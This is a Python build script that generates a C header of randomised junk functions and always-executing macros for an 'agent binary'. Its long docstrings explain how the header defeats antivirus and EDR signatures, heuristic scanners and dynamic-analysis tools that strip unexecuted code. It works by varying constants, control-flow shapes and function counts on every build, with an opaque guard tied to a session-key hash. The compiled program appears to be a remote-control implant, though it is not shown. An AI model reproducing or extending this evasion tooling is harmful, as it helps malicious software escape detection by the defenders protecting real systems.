#!/usr/bin/env python3
"""
gen_poly_stubs.py — Build-time junk-function generator for polymorphic evasion
===============================================================================

PURPOSE
-------
This script generates ``poly_stubs.h``, a C header containing between 6 and 14
randomly-generated "junk functions" that are compiled into the agent binary but
never actually called during normal execution.

WHY JUNK FUNCTIONS?
--------------------
Antivirus and EDR (Endpoint Detection and Response) engines identify malware
using "signatures" — patterns of bytes that appear in known-malicious binaries.
A signature might be:
  "bytes 0x48 0x31 0xC0 0x48 0x89 at offset X mean this is malware Y"

If you recompile the same C code with a different compiler flag or a trivial
source change, those byte offsets shift and the signature no longer matches.
But the OVERALL BYTE STATISTICS (entropy, common instruction patterns) often
remain recognisable.

Junk functions attack this from a different angle: they inject large amounts
of legitimate-looking but meaningless computation into the binary.  Every
build generates DIFFERENT junk (different constants, different control-flow
shapes), so:
  1. The binary's byte distribution changes every build.
  2. Any byte-pattern signature must match a specific junk layout, which
     is probabilistically unique to each build.
  3. The functions look like real code (they have loops, conditionals,
     arithmetic) so they don't stand out to heuristic analysers.

These techniques are standard in commercial packers and are also used by
legitimate obfuscation tools like LLVM-Obfuscator.

WHY ARE THERE MULTIPLE TEMPLATE TYPES?
----------------------------------------
A single template (e.g. always a straight-line arithmetic chain) would
produce similar instruction patterns across builds even with different
constants, because the same opcodes appear in the same ORDER.  By
randomly choosing among five template "shapes" (linear, branch, loop,
bytearray, nested), we vary both the constants AND the control-flow
graph (CFG) — i.e. which basic blocks exist and how they connect.

WHAT DOES EACH TEMPLATE PRODUCE IN x86_64?
--------------------------------------------

  tmpl_linear   : a straight chain of MOV/XOR/OR/AND/ADD/SUB instructions
                  on 64-bit registers.  Produces a sequence of arithmetic
                  opcodes with no branches.  REX.W prefix (0x48) + various
                  opcodes (0x31/0x09/0x21/0x01/0x29).

  tmpl_branch   : contains a conditional test and a JE/JNE (jump-if-equal /
                  jump-if-not-equal) instruction, creating two separate code
                  paths.  The compiler must emit a CMP + Jcc instruction pair.

  tmpl_loop     : a ``for`` loop that produces a counter register, an
                  increment (ADD or INC), a compare (CMP), and a backward
                  branch (JL/JNE).  Looks like real accumulator code.

  tmpl_bytearray: operates on individual bytes using MOVZX (zero-extend byte
                  to 64-bit) and byte-level XOR.  Produces a very different
                  instruction mix from the 64-bit-only templates above because
                  it emits byte-operand instructions (REX prefix optional,
                  different ModRM encodings).

  tmpl_nested   : two levels of nested ``if`` statements, producing a
                  control-flow graph with three possible exit paths.  Mimics
                  the kind of dispatch/switch logic found in real code.

HOW DOES POLY_CALL_CHAIN PREVENT GCC FROM DISCARDING THE FUNCTIONS?
--------------------------------------------------------------------
Even if you mark a function ``__attribute__((used))``, the linker's
--gc-sections option (which removes unused code sections) and Link-Time
Optimisation (LTO) can still eliminate functions that are never referenced.

To prevent this, we generate a macro called POLY_CALL_CHAIN(g):

    if (g == POLY_DEAD_CONST) {
        volatile uint64_t _pr = (uint64_t)(g);
        _pr = _poly_junk_000(_pr);
        _pr = _poly_junk_001(_pr);
        ...
        (void)_pr;
    }

This references every junk function from real code (not dead code), so the
linker cannot remove them.  The "dependency chain" pattern (_pr feeds each
call's result into the next call's argument) forces the compiler to emit
a real CALL instruction for each function in sequence — it cannot reorder
or merge them because each call's output is the next call's input.

The guard condition ``g == POLY_DEAD_CONST`` is always FALSE at the call
site (see gen_poly_cfg.py for details on why), so the junk functions have
ZERO RUNTIME OVERHEAD while still being compiled into the binary.

Usage: python3 gen_poly_stubs.py [output_path]
"""
import os
import sys

# ── Entropy pool ───────────────────────────────────────────────────────────────
# Pre-read 512 bytes of cryptographic randomness from /dev/urandom into a pool.
# Reading in bulk is faster than calling os.urandom() hundreds of times.
_pool = os.urandom(512)
_idx  = 0    # current read position in the pool


def _rb4() -> int:
    """
    Read 4 bytes from the entropy pool and return them as a 32-bit integer.

    The index wraps around (modulo pool size minus 4) so we never overrun
    the pool.  512 bytes is more than enough for all the random values this
    script needs for up to 14 functions.
    """
    global _idx
    v = int.from_bytes(_pool[_idx:_idx+4], 'little')   # little-endian 32-bit integer
    _idx = (_idx + 4) % (len(_pool) - 4)               # advance and wrap the pool cursor
    return v


# ── Convenience wrappers around _rb4() ────────────────────────────────────────

def rb1()  -> int:
    """Return a random byte (0-255)."""
    return _rb4() & 0xFF

def ru32() -> int:
    """Return a random unsigned 32-bit integer."""
    return _rb4() & 0xFFFFFFFF

def ru64() -> int:
    """
    Return a random unsigned 64-bit integer.

    Two independent 32-bit reads are combined: the first becomes the
    upper 32 bits (shifted left by 32) and the second becomes the lower
    32 bits.
    """
    return (_rb4() << 32 | _rb4()) & 0xFFFFFFFFFFFFFFFF

def rn(lo, hi):
    """Return a random integer in [lo, hi] inclusive."""
    return lo + (_rb4() % (hi - lo + 1))

def rc(lst):
    """Return a uniformly random element from list ``lst``."""
    return lst[_rb4() % len(lst)]


# ── Operator sets used in C expression generation ─────────────────────────────
OPS_BINARY = ['^', '|', '&', '+', '-']    # binary infix operators (XOR, OR, AND, ADD, SUB)
OPS_ASSIGN = ['^=', '|=', '&=', '+=', '-=']  # compound assignment versions of the above
TYPES32    = ['uint32_t']      # 32-bit unsigned integer type
TYPES64    = ['uint64_t']      # 64-bit unsigned integer type
TYPES_ALL  = ['uint32_t', 'uint64_t']   # either width


# ── Template 1: Linear arithmetic chain ───────────────────────────────────────

def tmpl_linear(fname: str, idx: int) -> list[str]:
    """
    Generate a function that is a straight-line chain of arithmetic operations.

    No branches, no loops — just a sequence of 4 to 7 binary operations on a
    single 64-bit accumulator variable.

    In x86_64 this compiles to a sequence of instructions like:
        mov rax, <const>       ; load a random 64-bit constant
        xor rax, rbx           ; XOR accumulator with input register
        or  rax, <const>       ; OR with another random constant
        add rax, <const>       ; ADD another constant
        ...
        ret                    ; return the result

    The ``volatile`` qualifiers prevent the compiler from pre-computing the
    result at compile time (constant folding), which would collapse the whole
    function into a single ``mov rax, <precomputed>`` and defeat our purpose.

    Parameters
    ----------
    fname : the C function name to use (e.g. "_poly_junk_003")
    idx   : index of this function in the overall list (unused here, kept for
            signature consistency with other templates)
    """
    t_in  = rc(TYPES_ALL)   # randomly pick uint32_t or uint64_t for the parameter
    t_mid = 'uint64_t'      # always accumulate in 64 bits to produce varied opcodes
    depth = rn(4, 7)        # 4 to 7 arithmetic steps per function
    lines = [
        f"__attribute__((noinline, used))",   # noinline: force a real CALL; used: don't discard
        f"static {t_mid} {fname}(volatile {t_in} _x) {{",
        # Initialise the accumulator with the input XOR'd with a random 64-bit constant.
        # Using volatile for _v prevents the compiler from seeing a constant-value path.
        f"    volatile {t_mid} _v = (uint64_t)_x ^ {ru64()}ULL;",
    ]
    # Chain additional operations: pick a random compound operator and a random constant.
    for k in range(depth):
        op  = rc(OPS_BINARY)     # one of ^, |, &, +, -
        val = ru64()             # random 64-bit constant for this step
        lines.append(f"    _v {rc(OPS_ASSIGN)} {val}ULL;")
    lines += [
        # Final AND with a random mask gives a return value that cannot be
        # predicted without knowing the constants.
        f"    return _v & {ru64()}ULL;",
        "}",
    ]
    return lines


# ── Template 2: Conditional branch ────────────────────────────────────────────

def tmpl_branch(fname: str, idx: int) -> list[str]:
    """
    Generate a function with a single conditional branch (two code paths).

    The branch tests whether a specific bit of the XOR'd input is set.
    Because the input is volatile, the compiler cannot determine at compile
    time which path will be taken, so it emits BOTH paths and a conditional
    jump (JE / JNE in x86_64).

    In x86_64 this compiles to something like:
        xor  rax, <const>     ; compute _a
        test rax, <bit_mask>  ; test the chosen bit
        jz   .else_branch     ; jump to else-path if bit is 0
        <then-path operations>
        ret
    .else_branch:
        <else-path operations>
        ret

    Having two returns with different values makes the CFG non-trivial.
    """
    bit   = 1 << (rn(0, 30))   # a random power of two (one specific bit)
    a, b  = ru64(), ru64()      # random constants for the two branches
    c, d  = ru64(), ru64()
    op1   = rc(OPS_BINARY)      # operator used in the "then" branch
    op2   = rc(OPS_BINARY)      # operator used in the "else" branch
    return [
        f"__attribute__((noinline, used))",
        f"static uint64_t {fname}(volatile uint64_t _x) {{",
        f"    volatile uint64_t _a = _x ^ {a}ULL;",   # XOR input with constant
        f"    if (_a & {bit}ULL) {{",                  # branch on a specific bit
        f"        volatile uint64_t _b = _a {op1} {b}ULL;",   # then-path
        f"        return _b & {c}ULL;",
        f"    }}",
        f"    volatile uint64_t _c = _a {op2} {d}ULL;",        # else-path
        f"    return _c ^ {ru64()}ULL;",
        "}",
    ]


# ── Template 3: Loop accumulator ───────────────────────────────────────────────

def tmpl_loop(fname: str, idx: int) -> list[str]:
    """
    Generate a function with a short counting loop (3 to 9 iterations).

    The loop accumulates a result by applying 2-4 operations per iteration,
    mixing the loop counter (_i) into the computation via a bit-shift.

    In x86_64 this compiles to:
        mov  <reg>, <init_const>   ; initialise _r
        xor  ecx, ecx             ; _i = 0
    .loop:
        <body operations using _r, _x, _i>
        inc  ecx
        cmp  ecx, <iters>
        jl   .loop                ; back-edge: jump if _i < iters
        ret

    The back-edge (the jump to .loop) is what distinguishes this from the
    linear template.  AV tools see a different CFG shape.
    """
    iters = rn(3, 9)    # number of loop iterations (short enough to inline safely, long enough to look real)
    init  = ru64()      # initial value of the accumulator _r
    # Build 2-4 body operations: each applies a compound assignment with a random constant
    # mixed with the input XOR shifted by the loop counter.
    ops   = [(rc(OPS_ASSIGN), ru64()) for _ in range(rn(2, 4))]
    body  = '\n'.join(
        f"        _r {op} {val}ULL ^ (_x >> (_i & 7));"   # (_i & 7) keeps shift in [0, 7]
        for op, val in ops
    )
    return [
        f"__attribute__((noinline, used))",
        f"static uint64_t {fname}(volatile uint64_t _x) {{",
        f"    volatile uint64_t _r = {init}ULL;",          # accumulator initialised with random constant
        f"    for (int _i = 0; _i < {iters}; _i++) {{",   # counting loop
        body,                                               # loop body (2-4 operations)
        f"    }}",
        f"    return _r;",
        "}",
    ]


# ── Template 4: Byte-array shuffle ────────────────────────────────────────────

def tmpl_bytearray(fname: str, idx: int) -> list[str]:
    """
    Generate a function that splits a 64-bit input into individual bytes and
    processes each one with a byte-level mask and a bit-shift.

    WHY THIS PRODUCES VERY DIFFERENT OPCODES:
    -----------------------------------------
    The other templates work on 64-bit (QWORD) values using 64-bit registers
    (rax, rbx, ...) and produce REX.W-prefixed opcodes (0x48 prefix byte).

    This template works on individual bytes using 8-bit register halves
    (al, bl, ...) which produce DIFFERENT opcodes: MOVZX (move with zero
    extension), byte-width XOR, and byte-width MOV.  The instruction
    density and prefix patterns look completely different to a scanner.

    The ``_km`` (key mask) and ``_ks`` (key shift) arrays are unique random
    values every build, so even the ``static const`` table patterns differ.
    """
    # 8 random byte masks — one per byte of the 64-bit input
    mask_bytes = [rb1() for _ in range(8)]
    # 8 random bit-shift amounts, each a multiple of 8 in [0, 56]
    # (multiples of 8 align to byte boundaries in the 64-bit integer)
    shifts     = [rn(0, 7) * 8 for _ in range(8)]
    mask_bytes_str = ', '.join(f"0x{b:02X}U" for b in mask_bytes)
    shifts_str     = ', '.join(str(s) for s in shifts)
    return [
        f"__attribute__((noinline, used))",
        f"static uint64_t {fname}(volatile uint64_t _x) {{",
        f"    static const uint8_t _km[8] = {{{mask_bytes_str}}};",  # byte XOR masks (unique per build)
        f"    static const uint8_t _ks[8] = {{{shifts_str}}};",      # byte-select shifts
        f"    volatile uint8_t _b[8];",                               # temporary byte buffer
        # First loop: extract each byte from _x, XOR it with its mask.
        f"    for (int _i = 0; _i < 8; _i++)",
        f"        _b[_i] = (uint8_t)((_x >> _ks[_i]) ^ _km[_i]);",  # shift to extract byte, then XOR
        # Reconstruct a 64-bit result by shifting each processed byte back into place.
        f"    uint64_t _r = {ru64()}ULL;",                           # start with a random base value
        f"    for (int _i = 0; _i < 8; _i++)",
        f"        _r ^= (uint64_t)_b[_i] << (_i * 8);",             # XOR each byte into its lane
        f"    return _r;",
        "}",
    ]


# ── Template 5: Nested conditionals ───────────────────────────────────────────

def tmpl_nested(fname: str, idx: int) -> list[str]:
    """
    Generate a function with nested if-statements (3 possible return paths).

    The outer branch tests the LOW 32 bits of the processed input; the inner
    branch tests the HIGH 32 bits.  This creates a control-flow graph with
    three "leaves" (exit points), which is more complex than the two-path
    branch template.

    In x86_64 the compiler must emit:
      - A move of the low 32 bits to a 32-bit register (zero-extending)
      - A move of the high 32 bits (shift right 32 + truncate)
      - Two separate TEST + Jcc instruction pairs
      - Three separate RET instructions

    This mimics the kind of dispatch logic found in real event-handler or
    protocol-parser code.
    """
    a, b, c = ru64(), ru64(), ru64()    # random constants for the three paths
    d, e    = ru64(), ru64()
    op1, op2 = rc(OPS_BINARY), rc(OPS_BINARY)   # operators for two of the paths
    return [
        f"__attribute__((noinline, used))",
        f"static uint64_t {fname}(volatile uint64_t _x) {{",
        f"    volatile uint64_t _a = _x {op1} {a}ULL;",          # apply first operation to input
        f"    volatile uint32_t _lo = (uint32_t)_a;",             # extract low 32 bits
        f"    volatile uint32_t _hi = (uint32_t)(_a >> 32);",     # extract high 32 bits
        f"    if (_lo & 1U) {{",                                   # outer branch: test lowest bit of low word
        f"        if (_hi & 1U) return (_a {op2} {b}ULL) ^ {c}ULL;",  # inner branch: both bits set
        f"        return _a | {d}ULL;",                            # outer true, inner false
        f"    }}",
        f"    return (_a ^ {e}ULL) & {ru64()}ULL;",               # outer false (most common path)
        "}",
    ]


# ── List of all available templates ───────────────────────────────────────────
# The generator randomly selects from this list for each function slot.
TEMPLATES = [tmpl_linear, tmpl_branch, tmpl_loop, tmpl_bytearray, tmpl_nested]


# ── Live idempotent junk template builders ─────────────────────────────────────
#
# These produce C MACROS, not functions. The macros execute unconditionally at
# every call site (no dead-code guard). They have zero observable effect on
# program state, but they:
#   - Generate real x86_64 instructions that appear in execution traces
#   - Defeat coverage-based dead-code elimination (tools like BOLT, angr, or
#     dynamic binary rewriters that strip blocks never seen at runtime)
#   - Vary per build (random constants, random operations, random template choice)
#
# Anti-elimination design rules:
#   1. All intermediate values are 'volatile' → compiler MUST emit the computation
#      (volatile writes cannot be optimized away; volatile reads must be re-issued)
#   2. The macro argument (_g) is a runtime global, not a constant → prevents the
#      compiler from constant-folding the entire expression at compile time
#   3. Each macro uses variable names tagged with its index (e.g. _pl00_r) so
#      multiple macros can be expanded in the same C scope without name collisions
#   4. Results are consumed via (void) or via static volatile accumulators
#   5. POLY_DEAD_CONST (from poly_cfg.h) is used in the accumulator branch so the
#      compiler cannot prove the condition is unreachable (the static var is volatile)

def live_tmpl_acc(tag: str) -> list[str]:
    """
    Accumulator template.

    Increments a per-macro static volatile counter and checks it against
    POLY_DEAD_CONST. The check never fires in practice, but the compiler
    cannot prove it because the counter is volatile — so it must emit both
    the increment and the conditional branch.

    x86_64 output (approx):
        add DWORD PTR [rip+_pl##_a], <const>   ; increment static counter
        cmp DWORD PTR [rip+_pl##_a], POLY_DEAD_CONST
        jne .skip
        mov DWORD PTR [rsp-4], 0               ; branch body (never reached)
      .skip:
    """
    c1 = ru32()
    return [
        f"/* _POLY_LIVE_{tag}: static volatile accumulator — executes, no effect */",
        f"#define _POLY_LIVE_{tag}(_g) do {{ \\",
        f"    static volatile uint32_t _pl{tag}_a = 0; \\",
        f"    _pl{tag}_a += (uint32_t)(_g) ^ {c1}U; \\",
        f"    if (_pl{tag}_a == POLY_DEAD_CONST) {{ volatile int _pl{tag}_x = 0; (void)_pl{tag}_x; }} \\",
        f"}} while(0)",
    ]


def live_tmpl_rot(tag: str) -> list[str]:
    """
    Rotate-XOR template.

    Loads the input into a volatile register, rotates it by a random number
    of bits, XORs with a second constant, then discards the result via (void).

    x86_64 output (approx):
        mov  rax, (_g)              ; load input
        xor  rax, <c1>              ; XOR with constant
        rol  rax, <k>               ; rotate left k bits
        xor  rax, <c2>              ; XOR with second constant
        ; (void) → value is "used" from the compiler's perspective
    """
    k = rn(1, 31)
    c1, c2 = ru64(), ru64()
    return [
        f"/* _POLY_LIVE_{tag}: volatile rotate-XOR — executes, result discarded */",
        f"#define _POLY_LIVE_{tag}(_g) do {{ \\",
        f"    volatile uint64_t _pl{tag}_r = (uint64_t)(_g) ^ {c1}ULL; \\",
        f"    _pl{tag}_r = (_pl{tag}_r << {k}) | (_pl{tag}_r >> {64 - k}); \\",
        f"    _pl{tag}_r ^= {c2}ULL; \\",
        f"    (void)_pl{tag}_r; \\",
        f"}} while(0)",
    ]


def live_tmpl_bv(tag: str) -> list[str]:
    """
    Byte-view template.

    Decomposes the 32-bit input into a volatile byte array, then combines two
    bytes with random masks. Produces movzx / byte-register instructions that
    look like real data processing to static and dynamic analysis tools.

    x86_64 output (approx):
        movzx eax, BYTE PTR [rsp]   ; load byte 0 of input
        xor   al, <c0>              ; XOR with constant
        movzx ecx, BYTE PTR [rsp+3] ; load byte 3 of input
        xor   cl, <c3>              ; XOR with constant
        <op>  eax, ecx             ; combine
    """
    c0, c3 = rb1(), rb1()
    op = rc(['+', '^', '|'])
    return [
        f"/* _POLY_LIVE_{tag}: volatile byte decomposition — generates movzx/byte opcodes */",
        f"#define _POLY_LIVE_{tag}(_g) do {{ \\",
        f"    volatile uint8_t _pl{tag}_b[4] = {{ \\",
        f"        (uint8_t)(_g), (uint8_t)((_g)>>8), \\",
        f"        (uint8_t)((_g)>>16), (uint8_t)((_g)>>24) \\",
        f"    }}; \\",
        f"    volatile uint32_t _pl{tag}_v = \\",
        f"        ((uint32_t)_pl{tag}_b[0] ^ {c0}U) {op} ((uint32_t)_pl{tag}_b[3] ^ {c3}U); \\",
        f"    (void)_pl{tag}_v; \\",
        f"}} while(0)",
    ]


def live_tmpl_chain(tag: str) -> list[str]:
    """
    Multi-op arithmetic chain template.

    Loads the input into a volatile 64-bit variable then applies 2-4 random
    arithmetic operations (+=, ^=, &=, etc.) with random 64-bit constants.
    The result is discarded. The sequence of operations varies per build.

    x86_64 output (approx):
        mov  rax, (_g)
        xor  rax, <c0>
        add  rax, <c1>
        xor  rax, <c2>
        ...
    """
    c0 = ru64()
    ops = [(rc(OPS_ASSIGN), ru64()) for _ in range(rn(2, 4))]
    lines = [
        f"/* _POLY_LIVE_{tag}: volatile multi-op chain — executes, result discarded */",
        f"#define _POLY_LIVE_{tag}(_g) do {{ \\",
        f"    volatile uint64_t _pl{tag}_v = (uint64_t)(_g) ^ {c0}ULL; \\",
    ]
    for op, val in ops:
        lines.append(f"    _pl{tag}_v {op} {val}ULL; \\")
    lines += [
        f"    (void)_pl{tag}_v; \\",
        f"}} while(0)",
    ]
    return lines


LIVE_TEMPLATES = [live_tmpl_acc, live_tmpl_rot, live_tmpl_bv, live_tmpl_chain]


# ── Main generation ────────────────────────────────────────────────────────────

# Output path: from command line argument or default project layout.
out = sys.argv[1] if len(sys.argv) > 1 else "src/poly_stubs.h"

# N: how many junk functions to generate this build (randomly 6 to 14).
# Varying the COUNT also changes the binary size and symbol table, adding
# another dimension of polymorphism.
N   = rn(6, 14)

# Generate the function names: _poly_junk_000, _poly_junk_001, ...
func_names = [f"_poly_junk_{i:03d}" for i in range(N)]

# ── Header boilerplate ─────────────────────────────────────────────────────────
lines = [
    "/* poly_stubs.h — generated by gen_poly_stubs.py — do not edit",
    " *",
    " * Functions are compiled to real x86_64 opcodes via noinline+used.",
    " * POLY_CALL_CHAIN() references all of them so linker --gc-sections",
    " * and LTO cannot discard them. The guard is runtime-opaque but always",
    " * false → zero execution overhead.",
    " */",
    "#ifndef POLY_STUBS_H",     # include guard: this header may be included by multiple .c files
    "#define POLY_STUBS_H",
    "#include <stdint.h>",      # for uint8_t, uint32_t, uint64_t
    "#include <string.h>",      # included in case any template uses memcpy/memset (future-proofing)
    "",
]

# ── Randomly pick a template for each function slot ───────────────────────────
# Shuffling the template selection (as opposed to round-robin) means the ORDER
# of template types also varies between builds, further changing the binary layout.
template_picks = [rc(TEMPLATES) for _ in range(N)]

# ── Generate each junk function ───────────────────────────────────────────────
for i, (fname, tmpl) in enumerate(zip(func_names, template_picks)):
    lines += tmpl(fname, i)   # call the template builder to get C source lines
    lines.append("")           # blank line between functions for readability

# ── POLY_CALL_CHAIN macro ─────────────────────────────────────────────────────
# This macro is the mechanism that keeps all junk functions "alive" in the
# final binary.  It is inserted ONCE in main() (or the equivalent entry point)
# before the main event loop.
#
# HOW THE GUARD WORKS:
#   _g is passed as the argument — in practice this is g_aid_hash (a global
#   uint32_t that starts at 0 and is updated after ECDH key exchange).
#   POLY_DEAD_CONST is a random non-zero constant generated by gen_poly_cfg.py.
#   The condition (_g) == POLY_DEAD_CONST is always false at runtime because:
#     - Before ECDH: g_aid_hash = 0, POLY_DEAD_CONST != 0 (guaranteed)
#     - After ECDH:  g_aid_hash is a hash derived from the session key,
#                    which would have to accidentally equal POLY_DEAD_CONST
#                    (probability 1 in 2^32 per session).
#   But GCC cannot PROVE this at compile time (g_aid_hash is a non-const
#   global), so it must emit a real comparison and conditional jump, and
#   must emit real CALL instructions for all the junk functions inside.
#
# THE DEPENDENCY CHAIN (_pr):
#   Each junk function receives _pr as input and returns a new value stored
#   back into _pr.  This creates a data dependency: call N+1 cannot start
#   until call N finishes.  With a dependency chain, the compiler cannot
#   reorder or eliminate individual calls (it would change observable
#   program state if the branch were ever taken).

chain_lines = [
    "/* POLY_CALL_CHAIN(g): call all junk functions behind a runtime-opaque guard.",
    " * Insert exactly once in main() before the ENet loop. */",
    "#define POLY_CALL_CHAIN(_g) do { \\",
    "    if ((_g) == POLY_DEAD_CONST) { \\",          # guard: always false at runtime
    "        volatile uint64_t _pr = (uint64_t)(_g); \\",  # seed the dependency chain
]
# Add one call per junk function, feeding the previous result into the next.
for fname in func_names:
    chain_lines.append(f"        _pr = {fname}(_pr); \\")   # each call uses the previous result
chain_lines += [
    "        (void)_pr; \\",   # suppress "unused variable" warning for the final result
    "    } \\",
    "} while(0)",              # do-while(0) idiom: makes the macro safe to use after if/else
    "",
]

lines += chain_lines

# ── Live idempotent junk macro generation ─────────────────────────────────────
# M = 3..5 live macros per build (count also varies = extra dimension of poly)
M          = rn(3, 5)
# Tags start at N so variable names don't clash with dead-junk indices (000..N-1)
live_tags  = [f"{N + i:02d}" for i in range(M)]
live_picks = [rc(LIVE_TEMPLATES) for _ in range(M)]

lines += [
    "",
    "/* ── Live idempotent junk macros ─────────────────────────────────────────",
    " * Unlike POLY_CALL_CHAIN (dead code behind a guard), these macros execute",
    " * unconditionally at every call site — no if-guard, no dead branch.",
    " *",
    " * They produce zero observable effect on program state but generate real",
    " * x86_64 instructions visible in execution traces and code-coverage maps,",
    " * defeating dynamic-analysis tools that strip 'never-executed' blocks.",
    " *",
    " * POLY_LIVE_ALL(_g): insert at hot call sites (loop body, function entry).",
    " * _g must be a runtime global (e.g. g_turn, g_aid_hash) — never a literal.",
    " */",
]

for tag, tmpl in zip(live_tags, live_picks):
    lines += tmpl(tag)
    lines.append("")

# POLY_LIVE_ALL: single macro that expands all live snippets in sequence.
# No guard — every expansion executes unconditionally.
live_all_lines = [
    "/* POLY_LIVE_ALL(_g): expand all live junk macros — NO guard, always executes. */",
    "#define POLY_LIVE_ALL(_g) do { \\",
]
for tag in live_tags:
    live_all_lines.append(f"    _POLY_LIVE_{tag}(_g); \\")
live_all_lines += [
    "} while(0)",
    "",
]
lines += live_all_lines

lines.append("#endif /* POLY_STUBS_H */")   # close the include guard

# ── Write the output file ──────────────────────────────────────────────────────
with open(out, 'w') as f:
    f.write('\n'.join(lines) + '\n')

# Print a human-readable summary of which templates were used.
tnames      = [t.__name__ for t in template_picks]
live_tnames = [t.__name__ for t in live_picks]
print(f"[*] poly_stubs.h: {N} dead-junk functions  templates={tnames}")
print(f"[*] poly_stubs.h: {M} live-junk macros     templates={live_tnames}")
